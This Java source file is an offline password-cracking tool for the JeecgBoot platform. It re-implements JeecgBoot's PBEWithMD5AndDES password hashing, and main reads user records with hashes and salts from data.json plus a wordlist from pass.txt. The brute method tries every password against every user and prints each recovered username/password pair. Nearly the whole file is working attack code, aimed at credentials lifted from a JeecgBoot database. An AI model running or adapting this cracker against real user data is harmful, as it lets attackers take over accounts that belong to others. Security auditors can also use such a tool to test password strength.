import java.io.IOException;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;
import java.util.*;
import java.nio.file.*;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;

public class JeecgBoot_offline_brute {
    public static final String ALGORITHM = "PBEWithMD5AndDES";
    private static final int ITERATIONCOUNT = 1000;


    public static String encrypt(String plaintext, String password, String salt) {

        Key key = getPbeKey(password);
        byte[] encipheredData = null;
        PBEParameterSpec parameterSpec = new PBEParameterSpec(salt.getBytes(), ITERATIONCOUNT);
        try {
            Cipher cipher = Cipher.getInstance(ALGORITHM);

            cipher.init(Cipher.ENCRYPT_MODE, key, parameterSpec);
            //update-begin-author:sccott date:20180815 for:中文作为用户名时，加密的密码windows和linux会得到不同的结果 gitee/issues/IZUD7
            encipheredData = cipher.doFinal(plaintext.getBytes("utf-8"));
            //update-end-author:sccott date:20180815 for:中文作为用户名时，加密的密码windows和linux会得到不同的结果 gitee/issues/IZUD7
        } catch (Exception e) {
        }
        return bytesToHexString(encipheredData);
    }

    /**
     * 根据PBE密码生成一把密钥
     *
     * @param password 生成密钥时所使用的密码
     * @return Key PBE算法密钥
     */
    private static Key getPbeKey(String password) {

        // 实例化使用的算法
        SecretKeyFactory keyFactory;
        SecretKey secretKey = null;
        try {
            keyFactory = SecretKeyFactory.getInstance(ALGORITHM);
            // 设置PBE密钥参数
            PBEKeySpec keySpec = new PBEKeySpec(password.toCharArray());
            // 生成密钥
            secretKey = keyFactory.generateSecret(keySpec);
        } catch (Exception e) {

        }

        return secretKey;
    }

    /**
     * 将字节数组转换为十六进制字符串
     *
     * @param src 字节数组
     * @return
     */
    public static String bytesToHexString(byte[] src) {
        StringBuilder stringBuilder = new StringBuilder("");
        if (src == null || src.length <= 0) {
            return null;
        }
        for (int i = 0; i < src.length; i++) {
            int v = src[i] & 0xFF;
            String hv = Integer.toHexString(v);
            if (hv.length() < 2) {
                stringBuilder.append(0);
            }
            stringBuilder.append(hv);
        }
        return stringBuilder.toString();
    }

    public static void brute(List<Map<String, String>> userList, List<String> passwords) {
        int totalAttempts = userList.size() * passwords.size();
        int currentAttempt = 0;
        // 更新进度条
        System.out.printf("开始离线爆破，总数: %d\n", totalAttempts);

        for (Map<String, String> user : userList) {
            String username = user.get("username");
            String en_password = user.get("password");
            String salt = user.get("salt");

            for (String password : passwords) {
                currentAttempt++;
                String encrypt_password = encrypt(username, password, salt);
                if (en_password.equals(encrypt_password)) {
                    System.out.printf("[+] 爆破成功: %s/%s\n", username, password);
                }
            }
        }

        System.out.println("\n[*] 结束");
    }

    public static void main(String[] args) throws IOException {
        try {
            Path jsonPath = Paths.get("data.json");
            Path passPath = Paths.get("pass.txt");

            if (!Files.exists(jsonPath)) {
                System.out.println("data.json 文件不存在");
                return;
            }

            if (!Files.exists(passPath)) {
                System.out.println("pass.txt 文件不存在");
                return;
            }

            String jsonData = new String(Files.readAllBytes(jsonPath));
            List<String> passwords = Files.readAllLines(passPath);

            ObjectMapper objectMapper = new ObjectMapper();
            List<Map<String, String>> userList = objectMapper.readValue(jsonData, new TypeReference<List<Map<String, String>>>() {});

            brute(userList, passwords);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}


